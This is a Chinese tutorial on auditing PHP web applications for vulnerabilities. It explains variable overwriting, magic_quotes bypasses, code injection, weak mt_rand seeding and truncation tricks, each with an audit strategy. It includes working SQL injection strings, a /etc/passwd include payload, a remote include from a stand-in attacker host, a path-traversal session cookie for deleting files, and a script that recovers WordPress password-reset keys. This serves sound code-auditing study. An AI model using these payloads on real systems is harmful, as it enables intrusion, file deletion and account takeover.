# 高级PHP应用程序漏洞审核技术 #



## 前言 ##

PHP是一种被广泛使用的脚本语言，尤其适合于web开发。具有跨平台，容易学习，功能强大等特点，据统计全世界有超过34%的网站有php的应用，包括Yahoo、sina、163、sohu等大型门户网站。而且很多具名的web应用系统（包括bbs,blog,wiki,cms等等）都是使用php开发的，Discuz、phpwind、phpbb、vbb、wordpress、boblog等等。随着web安全的热点升级，php应用程序的代码安全问题也逐步兴盛起来，越来越多的安全人员投入到这个领域，越来越多的应用程序代码漏洞被披露。针对这样一个状况，很多应用程序的官方都成立了安全部门，或者雇佣安全人员进行代码审计，因此出现了很多自动化商业化的代码审计工具。也就是这样的形势导致了一个局面：大公司的产品安全系数大大的提高，那些很明显的漏洞基本灭绝了，那些大家都知道的审计技术都无用武之地了。我们面对很多工具以及大牛扫描过n遍的代码，有很多的安全人员有点悲观，而有的官方安全人员也非常的放心自己的代码，但是不要忘记了“没有绝对的安全”，我们应该去寻找新的途径挖掘新的漏洞。本文就给介绍了一些非传统的技术经验和大家分享。

另外在这里特别说明一下本文里面很多漏洞都是来源于网络上牛人和朋友们的分享，在这里需要感谢他们 ：）

## 传统的代码审计技术 ##

WEB应用程序漏洞查找基本上是围绕两个元素展开：变量与函数。也就是说一漏洞的利用必须把你提交的恶意代码通过变量经过n次变量转换传递，最终传递给目标函数执行，还记得MS那句经典的名言吗？“一切输入都是有害的”。这句话只强调了变量输入，很多程序员把“输入”理解为只是gpc`[`$`_`GET,$`_`POST,$`_`COOKIE`]`，但是变量在传递过程产生了n多的变化。导致很多过滤只是个“纸老虎”！我们换句话来描叙下代码安全：“一切进入函数的变量是有害的”。

PHP代码审计技术用的最多也是目前的主力方法：静态分析，主要也是通过查找容易导致安全漏洞的危险函数，常用的如grep，findstr等搜索工具，很多自动化工具也是使用正则来搜索这些函数。下面列举一些常用的函数，也就是下文说的字典（暂略）。但是目前基本已有的字典很难找到漏洞，所以我们需要扩展我们的字典，这些字典也是本文主要探讨的。

其他的方法有：通过修改PHP源代码来分析变量流程，或者hook危险的函数来实现对应用程序代码的审核，但是这些也依靠了我们上面提到的字典。

## PHP版本与应用代码审计 ##

到目前为止，PHP主要有3个版本：php4、php5、php6，使用比例大致如下：

| php4 | 68% | 2000-2007，No security fixes after 2008/08，最终版本是php4.4.9 |
|:-----|:----|:--------------------------------------------------------|
| php5 | 32% | 2004-present，Now at version 5.2.6（PHP 5.3 alpha1 released!） |
| php6 |     | 目前还在测试阶段，变化很多做了大量的修改，取消了很多安全选项如magic\_quotes\_gpc（这个不是今天讨论的范围） |

由于php缺少自动升级的机制，导致目前PHP版本并存，也导致很多存在漏洞没有被修补。这些有漏洞的函数也是我们进行WEB应用程序代码审计的重点对象，也是我们字典重要来源。

## 其他的因素与应用代码审计 ##

很多代码审计者拿到代码就看，他们忽视了“安全是一个整体”，代码安全很多的其他因素有关系，比如上面我们谈到的PHP版本的问题，比较重要的还有操作系统类型（主要是两大阵营win/`*`nix），WEB服务端软件（主要是iis/apache两大类型）等因素。这是由于不同的系统不同的WEB SERVER有着不同的安全特点或特性，下文有些部分会涉及。

所以我们在做某个公司WEB应用代码审计时，应该了解他们使用的系统，WEB服务端软件，PHP版本等信息。

## 扩展我们的字典 ##

下面将详细介绍一些非传统PHP应用代码审计一些漏洞类型和利用技巧。

### 变量本身的key ###

说到变量的提交很多人只是看到了GET/POST/COOKIE等提交的变量的值，但是忘记了有的程序把变量本身的key也当变量提取给函数处理。

```
<?php
//key.php?aaaa'aaa=1&bb'b=2 
//print_R($_GET); 
 foreach ($_GET AS $key => $value)
{
	print $key."\n";
}
?>
```

上面的代码就提取了变量本身的key显示出来，单纯对于上面的代码，如果我们提交URL：

```
key.php?<script>alert(1);</script>=1&bbb=2
```

那么就导致一个xss的漏洞，扩展一下如果这个key提交给include()等函数或者sql查询呢？：）

| **漏洞审计策略** |
|:-----------|
| PHP版本要求：无<br>系统要求：无<br>审计策略：通读代码 </tbody></table>

### 变量覆盖 ###

很多的漏洞查找者都知道extract()这个函数在指定参数为EXTR\_OVERWRITE或者没有指定函数可以导致变量覆盖，但是还有很多其他情况导致变量覆盖的如：

#### 遍历初始化变量 ####

请看如下代码：

```
<?php
//var.php?a=fuck
$a='hi';
foreach($_GET as $key => $value) {
	$$key = $value;
}
print $a;
?>
```

很多的WEB应用都使用上面的方式（注意循环不一定是foreach），如Discuz!4.1的WAP部分的代码：

```
$chs = '';
if($_POST && $charset != 'utf-8') {
	$chs = new Chinese('UTF-8', $charset);
	foreach($_POST as $key => $value) {
		$$key = $chs->Convert($value);
	}
	unset($chs);
```

| **漏洞审计策略** |
|:-----------|
| PHP版本要求：无<br>系统要求：无<br>审计策略：通读代码 </tbody></table>

#### parse\_str()变量覆盖漏洞 ####

```
//var.php?var=new
$var = 'init';                     
parse_str($_SERVER['QUERY_STRING']); 
print $var;
```

该函数一样可以覆盖数组变量，上面的代码是通过$`_`SERVER['QUERY\_STRING']来提取变量的，对于指定了变量名的我们可以通过注射“=”来实现覆盖其他的变量：

```
//var.php?var=1&a[1]=var1%3d222
$var1 = 'init';
parse_str($a[$_GET['var']]);
print $var1;
```

上面的代码通过提交$var来实现对$var1的覆盖。

| **漏洞审计策略（parse\_str）** |
|:-----------------------|
| PHP版本要求：无<br>系统要求：无<br>审计策略：查找字符parse_str </tbody></table>

| **漏洞审计策略（mb\_parse\_str）** |
|:---------------------------|
| PHP版本要求：php4<4.4.7 php5<5.2.2<br>系统要求：无<br>审计策略：查找字符mb_parse_str </tbody></table>


#### import\_request\_variables()变量覆盖漏洞 ####

```
//var.php?_SERVER[REMOTE_ADDR]=10.1.1.1
echo 'GLOBALS '.(int)ini_get("register_globals")."n";
import_request_variables('GPC');
if ($_SERVER['REMOTE_ADDR'] != '10.1.1.1') die('Go away!');
echo 'Hello admin!';
```

| **漏洞审计策略（import\_request\_variables）** |
|:---------------------------------------|
| PHP版本要求：php4<4.4.1 php5<5.2.2<br>系统要求：无<br>审计策略：查找字符import_request_variables </tbody></table>

#### PHP5 Globals ####

从严格意义上来说这个不可以算是PHP的漏洞，只能算是一个特性，测试代码：

```
<?
// register_globals =ON
//foo.php?GLOBALS[foobar]=HELLO
php echo $foobar; 
?>
```

但是很多的程序没有考虑到这点，请看如下代码：

```
//为了安全取消全局变量
//var.php?GLOBALS[a]=aaaa&b=111
if (ini_get('register_globals')) foreach($_REQUEST as $k=>$v) unset(${$k});
print $a;
print $_GET[b];
```

如果熟悉WEB2.0的攻击的同学，很容易想到上面的代码我们可以利用这个特性进行crsf攻击。

| **漏洞审计策略** |
|:-----------|
| PHP版本要求：无<br>系统要求：无<br>审计策略：通读代码 </tbody></table>

### magic\_quotes\_gpc与代码安全 ###

#### 什么是magic\_quotes\_gpc ####

当打开时，所有的 '（单引号），"（双引号），\（反斜线）和 NULL 字符都会被自动加上一个反斜线进行转义。还有很多函数有类似的作用 如：addslashes()、mysql\_escape\_string()、mysql\_real\_escape\_string()等，另外还有parse\_str()后的变量也受magic\_quotes\_gpc的影响。目前大多数的主机都打开了这个选项，并且很多程序员也注意使用上面那些函数去过滤变量，这看上去很安全。很多漏洞查找者或者工具遇到些函数过滤后的变量直接就放弃，但是就在他们放弃的同时也放过很多致命的安全漏洞。 ：）

#### 哪些地方没有魔术引号的保护 ####

**1) $`_`SERVER变量**

PHP5的$`_`SERVER变量缺少magic\_quotes\_gpc的保护，导致近年来X-Forwarded-For的漏洞猛暴，所以很多程序员考虑过滤X-Forwarded-For，但是其他的变量呢？

| **漏洞审计策略（$`_`SERVER变量）** |
|:-------------------------|
| PHP版本要求：无<br>系统要求：无<br>审计策略：查找字符<code>_</code>SERVER </tbody></table>

**2) getenv()得到的变量（使用类似$`_`SERVER变量）**

| **漏洞审计策略（getenv()）** |
|:---------------------|
| PHP版本要求：无<br>系统要求：无<br>审计策略：查找字符getenv </tbody></table>

**3) $HTTP\_RAW\_POST\_DATA与PHP输入、输出流**

主要应用与soap/xmlrpc/webpublish功能里，请看如下代码：

```
if ( !isset( $HTTP_RAW_POST_DATA ) ) {
	$HTTP_RAW_POST_DATA = file_get_contents( 'php://input' );
}
if ( isset($HTTP_RAW_POST_DATA) )
	$HTTP_RAW_POST_DATA = trim($HTTP_RAW_POST_DATA);
```

| **漏洞审计策略（数据流）** |
|:----------------|
| PHP版本要求：无<br>系统要求：无<br>审计策略：查找字符HTTP_RAW_POST_DATA或者php://input </tbody></table>

**4) 数据库操作容易忘记'的地方如：in()/limit/order by/group by**

如Discuz!<5.0的pm.php：

```
if(is_array($msgtobuddys)) {
	$msgto = array_merge($msgtobuddys, array($msgtoid));
		......
foreach($msgto as $uid) {
	$uids .= $comma.$uid;
	$comma = ',';
}
......
$query = $db->query("SELECT m.username, mf.ignorepm FROM {$tablepre}members m
	LEFT JOIN {$tablepre}memberfields mf USING(uid)
	WHERE m.uid IN ($uids)");
```

| **漏洞审计策略** |
|:-----------|
| PHP版本要求：无<br>系统要求：无<br>审计策略：查找数据库操作字符（select,update,insert等等） </tbody></table>


#### 变量的编码与解码 ####

一个WEB程序很多功能的实现都需要变量的编码解码，而且就在这一转一解的传递过程中就悄悄的绕过你的过滤的安全防线。

这个类型的主要函数有：

**1) stripslashes() 这个其实就是一个decode-addslashes()**

**2) 其他字符串转换函数：**

| base64\_decode | 对使用 MIME base64 编码的数据进行解码 |
|:---------------|:--------------------------|
| base64\_encode | 使用 MIME base64 对数据进行编码    |
| rawurldecode   | 对已编码的 URL 字符串进行解码         |
| rawurlencode   | 按照 RFC 1738 对 URL 进行编码    |
| urldecode      | 解码已编码的 URL 字符串            |
| urlencode      | 编码 URL 字符串                |
| ...            | ...                       |

_另外一个 unserialize/serialize_

**3) 字符集函数（GKB,UTF7/8...）如iconv()/mb\_convert\_encoding()等**

目前很多漏洞挖掘者开始注意这一类型的漏洞了，如典型的urldecode：

```
$sql = "SELECT * FROM article WHERE articleid='".urldecode($_GET[id])."'";
```

当magic\_quotes\_gpc=on时，我们提交?id=%2527，得到sql语句为：

```
SELECT * FROM article WHERE articleid='''
```

| **漏洞审计策略** |
|:-----------|
| PHP版本要求：无<br>系统要求：无<br>审计策略：查找对应的编码函数 </tbody></table>

#### 二次攻击 ####

_详细见附录`[`1`]`_

**1)数据库出来的变量没有进行过滤**

**2)数据库的转义符号：**

  * mysql/oracle转义符号同样是\（我们提交'通过魔术引号变化为\'，当我们update进入数据库时，通过转义变为'）
  * mssql的转义字符为'（所以我们提交'通过魔术引号变化为\'，mssql会把它当为一个字符串直接处理，所以魔术引号对于mssql的注射没有任何意义）

从这里我们可以思考得到一个结论：一切进入函数的变量都是有害的，另外利用二次攻击我们可以实现一个webrootkit，把我们的恶意构造直接放到数据库里。我们应当把这样的代码看成一个vul？

| **漏洞审计策略** |
|:-----------|
| PHP版本要求：无<br>系统要求：无<br>审计策略：通读代码 </tbody></table>

#### 魔术引号带来的新的安全问题 ####

首先我们看下魔术引号的处理机制：

```
[\-->\\,'-->\',"-->\",null-->\0]
```

这给我们引进了一个非常有用的符号“\”，“\”符号不仅仅是转义符号，在WIN系统下也是目录转跳的符号。这个特点可能导致php应用程序里产生非常有意思的漏洞：

**1)得到原字符（',\,",null]）**

```
$order_sn=substr($_GET['order_sn'], 1);

//提交                 '
//魔术引号处理         \'
//substr               '

$sql = "SELECT order_id, order_status, shipping_status, pay_status, ".
   " shipping_time, shipping_id, invoice_no, user_id ".
   " FROM " . $ecs->table('order_info').
   " WHERE order_sn = '$order_sn' LIMIT 1";
```

**2)得到“\”字符**

```
$order_sn=substr($_GET['order_sn'], 0,1);

//提交                 '
//魔术引号处理         \'
//substr               \    

$sql = "SELECT order_id, order_status, shipping_status, pay_status, ".
   " shipping_time, shipping_id, invoice_no, user_id ".
   " FROM " . $ecs->table('order_info').
   " WHERE order_sn = '$order_sn' and order_tn='".$_GET['order_tn']."'";
```

提交内容：

```
?order_sn='&order_tn=%20and%201=1/* 
```

执行的SQL语句为：

```
SELECT order_id, order_status, shipping_status, pay_status, shipping_time, 
shipping_id, invoice_no, user_id FROM order_info WHERE order_sn = '\' and 
order_tn=' and 1=1/*'
```

| **漏洞审计策略** |
|:-----------|
| PHP版本要求：无<br>系统要求：无<br>审计策略：查找字符串处理函数如substr或者通读代码 </tbody></table>

#### 变量key与魔术引号 ####

我们最在这一节的开头就提到了变量key，PHP的魔术引号对它有什么影响呢？

```
<?php
//key.php?aaaa'aaa=1&bb'b=2 
//print_R($_GET); 
 foreach ($_GET AS $key => $value)
        {
        print $key."\n";
        }
?>
```

**1)当magic\_quotes\_gpc = On时，在php5.24下测试显示：**

```
aaaa\'aaa
bb\'b
```

从上面结果可以看出来，在设置了magic\_quotes\_gpc = On下，变量key受魔术引号影响。但是在php4和php<5.2.1的版本中，不处理数组第一维变量的key，测试代码如下：

```
<?php
//key.php?aaaa'aaa[bb']=1 
print_R($_GET); 
?>
```

结果显示:

```
Array ( [aaaa'aaa] => Array ( [bb\'] => 1 ) ) 
```

数组第一维变量的key不受魔术引号的影响。

| **漏洞审计策略** |
|:-----------|
| PHP版本要求：php4和php<5.2.1<br>系统要求：无<br>审计策略：通读代码 </tbody></table>


**2)当magic\_quotes\_gpc = Off时，在php5.24下测试显示：**

```
aaaa'aaa
bb'b
```

对于magic\_quotes\_gpc = Off时所有的变量都是不安全的，考虑到这个，很多程序都通过addslashes等函数来实现魔术引号对变量的过滤，示例代码如下：

```
<?php 
//keyvul.php?aaa'aa=1'
//magic_quotes_gpc = Off
 if (!get_magic_quotes_gpc())
{
 $_GET  = addslashes_array($_GET);
}

function addslashes_array($value)
{
        return is_array($value) ? array_map('addslashes_array', $value) : addslashes($value);
}
print_R($_GET);
foreach ($_GET AS $key => $value)
{
	print $key;
}
?>
```

以上的代码看上去很完美，但是他这个代码里addslashes($value)只处理了变量的具体的值，但是没有处理变量本身的key，上面的代码显示结果如下：

```
Array
(
    [aaa'aa] => 1\'
)
aaa'aa
```

| **漏洞审计策略** |
|:-----------|
| PHP版本要求：无<br>系统要求：无<br>审计策略：通读代码 </tbody></table>

### 代码注射 ###

#### PHP中可能导致代码注射的函数 ####

很多人都知道eval、preg\_replace+/e可以执行代码，但是不知道php还有很多的函数可以执行代码如：

| assert() |
|:---------|
| call\_user\_func() |
| call\_user\_func\_array() |
| create\_function() |
| 变量函数     |
| ...      |

这里我们看看最近出现的几个关于create\_function()代码执行漏洞的代码：

```
<?php
//how to exp this code
$sort_by=$_GET['sort_by'];
$sorter='strnatcasecmp';
$databases=array('test','test');
$sort_function = '  return 1 * ' . $sorter . '($a["' . $sort_by . '"], $b["' . $sort_by . '"]);
	      ';
usort($databases, create_function('$a, $b', $sort_function));
```

| **漏洞审计策略** |
|:-----------|
| PHP版本要求：无<br>系统要求：无<br>审计策略：查找对应函数（assert,call_user_func,call_user_func_array,create_function等） </tbody></table>

#### 变量函数与双引号 ####

对于单引号和双引号的区别，很多程序员深有体会，示例代码：

```
echo "$a\n";
echo '$a\n';
```

我们再看如下代码：

```
//how to exp this code
if($globals['bbc_email']){

$text = preg_replace(
		array("/\[email=(.*?)\](.*?)\[\/email\]/ies",
				"/\[email\](.*?)\[\/email\]/ies"),
		array('check_email("$1", "$2")',
				'check_email("$1", "$1")'), $text);
```

另外很多的应用程序都把变量用""存放在缓存文件或者config或者data文件里，这样很容易被人注射变量函数。

| **漏洞审计策略** |
|:-----------|
| PHP版本要求：无<br>系统要求：无<br>审计策略：通读代码 </tbody></table>

### PHP自身函数漏洞及缺陷 ###

#### PHP函数的溢出漏洞 ####

大家还记得Stefan Esser大牛的Month of PHP Bugs（MOPB见附录[2](2.md)）项目么，其中比较有名的要算是unserialize()，代码如下：

```
unserialize(stripslashes($HTTP_COOKIE_VARS[$cookiename . '_data']);
```

在以往的PHP版本里，很多函数都曾经出现过溢出漏洞，所以我们在审计应用程序漏洞的时候不要忘记了测试目标使用的PHP版本信息。

| **漏洞审计策略** |
|:-----------|
| PHP版本要求：对应fix的版本<br>系统要求：<br>审计策略：查找对应函数名 </tbody></table>

#### PHP函数的其他漏洞 ####

Stefan Esser大牛发现的漏洞：unset()--Zend\_Hash\_Del\_Key\_Or\_Index Vulnerability

比如phpwind早期的serarch.php里的代码：

```
unset($uids);
......
$query=$db->query("SELECT uid FROM pw_members WHERE username LIKE '$pwuser'");
while($member=$db->fetch_array($query)){
	$uids .= $member['uid'].',';
}
$uids ? $uids=substr($uids,0,-1) : $sqlwhere.=' AND 0 ';
........
$query = $db->query("SELECT DISTINCT t.tid FROM $sqltable WHERE $sqlwhere $orderby $limit");
```

| **漏洞审计策略** |
|:-----------|
| PHP版本要求：php4<4.3 php5<5.14<br>系统要求：无<br>审计策略：查找unset </tbody></table>

#### session\_destroy()删除文件漏洞 ####

_测试PHP版本：5.1.2_

这个漏洞是几年前朋友saiy发现的，session\_destroy()函数的功能是删除session文件，很多web应用程序的logout的功能都直接调用这个函数删除session，但是这个函数在一些老的版本中缺少过滤导致可以删除任意文件。测试代码如下：

```
<?php 
//val.php   
session_save_path('./');
session_start();
if($_GET['del']) {
	session_unset();
	session_destroy();
}else{
	$_SESSION['hei']=1;
	echo(session_id());
	print_r($_SESSION);
}
?>
```

当我们提交构造cookie:PHPSESSID=/../1.php，相当于unlink('sess`_`/../1.php')这样就通过注射../转跳目录删除任意文件了。很多著名的程序某些版本都受影响如phpmyadmin，sablog，phpwind3等等。

| **漏洞审计策略** |
|:-----------|
| PHP版本要求：具体不详<br>系统要求：无<br>审计策略：查找session_destroy </tbody></table>

#### 随机函数 ####

**1) rand() VS mt\_rand()**

```
<?php
//on windows
print mt_getrandmax(); //2147483647
print getrandmax();// 32767
?>
```

可以看出rand()最大的随机数是32767，这个很容易被我们暴力破解。

```
<?php
$a= md5(rand());
for($i=0;$i<=32767;$i++){
  if(md5($i) ==$a ) {
   print $i."-->ok!!<br>";exit;
   }else { print $i."<br>";}
}
?>
```

当我们的程序使用rand处理session时，攻击者很容易暴力破解出你的session，但是对于mt\_rand是很难单纯的暴力的。

| **漏洞审计策略** |
|:-----------|
| PHP版本要求：无<br>系统要求：无<br>审计策略：查找rand </tbody></table>

**2) mt\_srand()/srand()-weak seeding（by Stefan Esser）**

看php手册里的描述：

```
mt_srand
(PHP 3 >= 3.0.6, PHP 4, PHP 5)

mt_srand -- 播下一个更好的随机数发生器种子
说明
void mt_srand ( int seed )
```

用 seed 来给随机数发生器播种。从 PHP 4.2.0 版开始，seed 参数变为可选项，当该项为空时，会被设为随时数。

例子 1. mt\_srand() 范例

```
<?php
// seed with microseconds
function make_seed()
{
    list($usec, $sec) = explode(' ', microtime());
    return (float) $sec + ((float) $usec * 100000);
}
mt_srand(make_seed());
$randval = mt_rand();
?> 
```

_注: 自 PHP 4.2.0 起，不再需要用 srand() 或 mt\_srand() 函数给随机数发生器播种，现已自动完成。_

php从4.2.0开始实现了自动播种，但是为了兼容，后来使用类似于这样的代码播种：

```
mt_srand ((double) microtime() * 1000000)
```

但是使用(double)microtime()`*`1000000类似的代码seed是比较脆弱的：

```
0<(double) microtime()<1 ---> 0<(double) microtime()* 1000000<1000000
```

那么很容易暴力破解,测试代码如下：

```
<?php
/////////////////
//>php rand.php
//828682
//828682
////////////////
ini_set("max_execution_time",0);
$time=(double) microtime()* 1000000;
print $time."\n";
mt_srand ($time);

$search_id = mt_rand();
$seed = search_seed($search_id);
print $seed;
function search_seed($rand_num) {
$max = 1000000;
for($seed=0;$seed<=$max;$seed++){
	mt_srand($seed);
	$key = mt_rand();
	if($key==$rand_num) return $seed;
}
return false;
}
?>
```

从上面的代码实现了对seed的破解，另外根据Stefan Esser的分析seed还根据进程变化而变化，换句话来说同一个进程里的seed是相同的。 然后同一个seed每次mt\_rand的值都是特定的。如下图：

| **seed-A** |
|:-----------|
| mt\_rand-A-1<br>mt_rand-A-2<br>mt_rand-A-3 </tbody></table>

| **seed-B** |
|:-----------|
| mt\_rand-B-1<br>mt_rand-B-2<br>mt_rand-B-3 </tbody></table>

对于seed-A里mt\_rand-1/2/3都是不相等的，但是值都是特定的，也就是说当seed-A等于seed-B，那么mt\_rand-A-1就等于mt\_rand-B-1…，这样我们只要能够得到seed就可以得到每次mt\_rand的值了。

对于5.2.6>php>4.2.0直接使用默认播种的程序也是不安全的（很多的安全人员错误的以为这样就是安全的），这个要分两种情况来分析：

第一种：'Cross Application Attacks'，这个思路在Stefan Esser文章里有提到，主要是利用其他程序定义的播种（如mt\_srand ((double) microtime()`*` 1000000)），phpbb+wordpree组合就存在这样的危险.

第二种：5.2.6>php>4.2.0默认播种的算法也不是很强悍，这是Stefan Esser的文章里的描述：

> The Implementation<br>When mt_rand() is seeded internally or by a call to mt_srand() PHP 4 and PHP 5 <= 5.2.0 force the lowest bit to 1. Therefore the strength of the seed is only 31 and not 32 bits. In PHP 5.2.1 and above the implementation of the Mersenne Twister was changed and the forced bit removed.</li></ul>

在32位系统上默认的播种的种子为最大值是<code>2^32</code>，这样我们循环最多<code>2^32</code>次就可以破解seed。而在PHP 4和PHP 5 <= 5.2.0 的算法有个bug：奇数和偶数的播种是一样的（详见附录<a href='3.md'>3</a>）,测试代码如下：<br>
<br>
<pre><code>&lt;?php<br>
mt_srand(4); <br>
$a = mt_rand(); <br>
mt_srand(5); <br>
$b = mt_rand();<br>
print $a."\n".$b;<br>
?&gt;<br>
</code></pre>

通过上面的代码发现$a==$b，所以我们循环的次数为2<sup>32/2=2</sup>31次。我们看如下代码：<br>
<br>
<pre><code>&lt;?php<br>
//base on http://www.milw0rm.com/exploits/6421 <br>
//test on php 5.2.0<br>
<br>
define('BUGGY', 1); //上面代码$a==$b时候定义BUGGY=1<br>
<br>
$key = wp_generate_password(20, false);<br>
echo $key."\n";<br>
$seed = getseed($key);<br>
print $seed."\n"; <br>
<br>
mt_srand($seed);<br>
$pass = wp_generate_password(20, false);<br>
echo $pass."\n";	<br>
	<br>
function wp_generate_password($length = 12, $special_chars = true) {<br>
	$chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';<br>
	if ( $special_chars )<br>
		$chars .= '!@#$%^&amp;*()';<br>
<br>
	$password = '';<br>
	for ( $i = 0; $i &lt; $length; $i++ )<br>
		$password .= substr($chars, mt_rand(0, strlen($chars) - 1), 1);<br>
	return $password;<br>
} <br>
<br>
function getseed($resetkey) {<br>
	$max = pow(2,(32-BUGGY));<br>
	for($x=0;$x&lt;=$max;$x++) {<br>
		$seed = BUGGY ? ($x &lt;&lt; 1) + 1 : $x; <br>
		mt_srand($seed);<br>
		$testkey = wp_generate_password(20,false);<br>
		if($testkey==$resetkey) { echo "o\n"; return $seed; }<br>
<br>
		if(!($x % 10000)) echo $x / 10000;<br>
	}<br>
	echo "\n";<br>
	return false;<br>
}<br>
?&gt;<br>
</code></pre>

运行结果如下：<br>
<br>
<pre><code>php5&gt;php rand.php<br>
M8pzpjwCrvVt3oobAaOr<br>
0123456789101112131415161718192021222324252627282930313233343536373839404142434<br>
445464748495051525354555657585960616263646566676869<br>
7071727374757677787980818283848586878889909192939495969798991001011021031041051<br>
061071081091101111121131141151161171181191201211221<br>
2312412512612712812913013113213313413513613713813914014114214314414514614714814<br>
915015115215315415515615715815916016116216316416516<br>
6167168169170171172173174175176177178179180181182183184185186187188189190191192<br>
193194195196197198199200201202203204205206207208209<br>
2102112122132142152162172182192202212222232242252262272282292302312322332342352<br>
362372382392402412422432442452462472482492502512522<br>
..............01062110622106231062410625106261062710628106291063010631106321063<br>
3o<br>
70693<br>
pjwCrvVt3oobAaOr<br>
</code></pre>

当10634次时候我们得到了结果。<br>
<br>
当PHP版本到了5.2.1后，通过修改算法修补了奇数和偶数的播种相等的问题，这样也导致了php5.2.0前后导致同一个播种后的mt_rand()的值不一样。比如：<br>
<br>
<pre><code>&lt;?php<br>
mt_srand(42);<br>
echo mt_rand();<br>
//php&lt;=5.20 1387371436<br>
//php&gt;5.20 1354439493 		<br>
?&gt;<br>
</code></pre>

正是这个原因，也要求了我们的exp的运行环境：当目标>5.20时候，我们exp运行的环境也要是>5.20的版本，反过来也是一样。<br>
<br>
从上面的测试及分析来看，php<5.26不管有没有定义播种，mt_rand处理的数据都是不安全的。在web应用里很多都使用mt_rand来处理随机的session，比如密码找回功能等等，这样的后果就是被攻击者恶意利用直接修改密码。<br>
<br>
很多著名的程序都产生了类似的漏洞如wordpress、phpbb、punbb等等。（在后面我们将实际分析下国内著名的bbs程序Discuz!的mt_srand导致的漏洞）<br>
<br>
<table><thead><th> <b>漏洞审计策略</b> </th></thead><tbody>
<tr><td> PHP版本要求：php4 php5<5.2.6<br>系统要求：无<br>审计策略：查找mt_srand/mt_rand </td></tr></tbody></table>


<h3>特殊字符</h3>

其实“特殊字符”也没有特定的标准定义，主要是在一些code hacking发挥着特殊重作用的一类字符。下面就举几个例子：<br>
<br>
<h4>截断</h4>

其中最有名的数大家都熟悉的null字符截断。<br>
<br>
<h5>include截断</h5>

<pre><code>&lt;?php <br>
include $_GET['action'].".php"; <br>
?&gt;<br>
</code></pre>

提交“action=/etc/passwd%00”中的“%00”将截断后面的“.php”，但是除了“%00”还有没有其他的字符可以实现截断使用呢？肯定有人想到了远程包含的url里问号“?”的作用，通过提交“action=<code>http://www.hacksite.com/evil-code.txt</code>?”这里“?”实现了“伪截断”：），好象这个看上去不是那么舒服那么我们简单写个代码fuzz一下：<br>
<br>
<pre><code>&lt;?php<br>
////////////////////<br>
////var5.php代码:<br>
////include $_GET['action'].".php"; <br>
////print strlen(realpath("./"))+strlen($_GET['action']);  <br>
///////////////////<br>
ini_set('max_execution_time', 0);<br>
$str='';<br>
for($i=0;$i&lt;50000;$i++)<br>
{<br>
	$str=$str."/";<br>
<br>
	$resp=file_get_contents('http://127.0.0.1/var/var5.php?action=1.txt'.$str);<br>
	//1.txt里的代码为print 'hi';<br>
	if (strpos($resp, 'hi') !== false){<br>
		print $i;<br>
		exit;<br>
	}<br>
}<br>
?&gt;<br>
</code></pre>

经过测试字符“.”、“ /”或者2个字符的组合，在一定的长度时将被截断，win系统和<code>*</code>nix的系统长度不一样，当win下strlen(realpath("./"))+strlen($<code>_</code>GET<code>['action']</code>)的长度大于256时被截断，对于<code>*</code>nix的长度是4 <code>*</code> 1024 = 4096。对于php.ini里设置远程文件关闭的时候就可以利用上面的技巧包含本地文件了。（此漏洞由cloie#ph4nt0m.org最先发现]）<br>
<br>
<h5>数据截断</h5>

对于很多web应用文件在很多功能是不容许重复数据的，比如用户注册功能等。一般的应用程序对于提交注册的username和数据库里已有的username对比是不是已经有重复数据，然而我们可以通过“数据截断”等来饶过这些判断，数据库在处理时候产生截断导致插入重复数据。<br>
<br>
<b>1) Mysql SQL Column Truncation Vulnerabilities</b>

这个漏洞又是大牛Stefan Esser发现的（Stefan Esser是我的偶像:)），这个是由于mysql的sql_mode设置为default的时候，即没有开启STRICT_ALL_TABLES选项时，MySQL对于插入超长的值只会提示warning，而不是error（如果是error就插入不成功），这样可能会导致一些截断问题。测试如下：<br>
<br>
<pre><code>mysql&gt; insert into truncated_test(`username`,`password`) values("admin","pass");<br>
<br>
mysql&gt; insert into truncated_test(`username`,`password`) values("admin           x", "new_pass");<br>
Query OK, 1 row affected, 1 warning (0.01 sec)<br>
<br>
mysql&gt; select * from truncated_test;<br>
+----+------------+----------+<br>
| id | username   | password |<br>
+----+------------+----------+<br>
| 1 | admin      | pass     |<br>
| 2 | admin      | new_pass |<br>
+----+------------+----------+<br>
2 rows in set (0.00 sec)<br>
</code></pre>

<b>2) Mysql charset Truncation vulnerability</b>

这个漏洞是80sec发现的，当mysql进行数据存储处理utf8等数据时对某些字符导致数据截断。测试如下：<br>
<br>
<pre><code>mysql&gt; insert into truncated_test(`username`,`password`) values(concat("admin",0xc1), "new_pass2");<br>
Query OK, 1 row affected, 1 warning (0.00 sec)<br>
<br>
mysql&gt; select * from truncated_test;<br>
+----+------------+----------+<br>
| id | username   | password |<br>
+----+------------+----------+<br>
| 1 | admin      | pass      |<br>
| 2 | admin      | new_pass  |<br>
| 3 | admin      | new_pass2 |<br>
+----+------------+----------+<br>
2 rows in set (0.00 sec)<br>
</code></pre>

很多的web应用程序没有考虑到这些问题，只是在数据存储前简单查询数据是否包含相同数据，如下代码：<br>
<br>
<pre><code>$result = mysql_query("SELECT * from test_user where user='$user' ");<br>
  ....<br>
if(@mysql_fetch_array($result, MYSQL_NUM)) {<br>
	die("already exist");<br>
}<br>
</code></pre>

<table><thead><th> <b>漏洞审计策略</b> </th></thead><tbody>
<tr><td> PHP版本要求：无<br>系统要求：无<br>审计策略：通读代码 </td></tr></tbody></table>

<h5>文件操作里的特殊字符</h5>

文件操作里有很多特殊的字符，发挥特别的作用，很多web应用程序没有注意处理这些字符而导致安全问题。比如很多人都知道的windows系统文件名对“空格”和“.”等的忽视，这个主要体现在上传文件或者写文件上，导致直接写webshell。另外对于windows系统对“.\..\”进行系统转跳等等。<br>
<br>
下面还给大家介绍一个非常有意思的问题：<br>
<br>
<pre><code>//Is this code vul?<br>
if( eregi(".php",$url) ){<br>
	die("ERR");<br>
}<br>
$fileurl=str_replace($webdb[www_url],"",$url);<br>
.....<br>
header('Content-Disposition: attachment; filename='.$filename);<br>
</code></pre>

很多人看出来了上面的代码的问题，程序首先禁止使用“.php”后缀。但是下面居然接了个str_replace替换$webdb<a href='www_url.md'>www_url</a>为空，那么我们提交“.p$webdb<a href='www_url.md'>www_url</a>hp”就可以饶过了。那么上面的代码杂fix呢？有人给出了如下代码：<br>
<br>
<pre><code>$fileurl=str_replace($webdb[www_url],"",$url);<br>
if( eregi(".php",$url) ){<br>
	die("ERR");<br>
}<br>
</code></pre>

